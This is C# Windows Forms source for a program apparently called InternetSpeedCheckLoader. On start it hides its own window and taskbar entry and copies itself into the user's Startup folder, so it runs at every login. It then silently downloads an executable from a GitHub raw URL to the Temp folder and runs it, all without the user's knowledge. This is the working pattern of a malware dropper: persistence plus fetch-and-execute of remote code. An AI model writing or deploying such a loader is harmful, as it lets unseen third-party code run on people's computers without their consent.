using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace InternetSpeedCheckLoader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        string User = Environment.GetEnvironmentVariable("USERPROFILE");
        private void Form1_Load(object sender, EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) +
                             "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" +
                             Application.ProductName + ".exe"))
            {
                File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + Application.ProductName + ".exe");
            }
            using (var client = new WebClient())
            {
                client.DownloadFileCompleted += Client_DownloadFileCompleted;
                client.DownloadProgressChanged += Client_DownloadProgressChanged;
                FileName = System.Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) +
                           "\\AppData\\Local\\Temp\\InternetCheck.exe";
                try
                {
                    if(File.Exists(System.Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\InternetCheck.exe"))
                    {
                        File.Delete(System.Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\InternetCheck.exe");
                    }
                    client.DownloadFileAsync(new Uri("https://raw.githubusercontent.com/CNTowerGUN/InternetSpeedChecker/master/InternetSpeedChecker/bin/Debug/InternetSpeedChecker.exe"), System.Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\InternetCheck.exe");
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                    Application.Exit();
                }
            }
        }

        private string TotalBytes = string.Empty;
        private string FileName = string.Empty;
        private string FileSize = string.Empty;
        private void Client_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            TotalBytes = e.TotalBytesToReceive.ToString();
        }

        private void Client_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
        {
           if(e.Error != null) 
           {
                Console.WriteLine("Download Error");
           }
           else
           {
               Process.Start(System.Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) +
                             "\\AppData\\Local\\Temp\\InternetCheck.exe");
           }
        }
    }
}
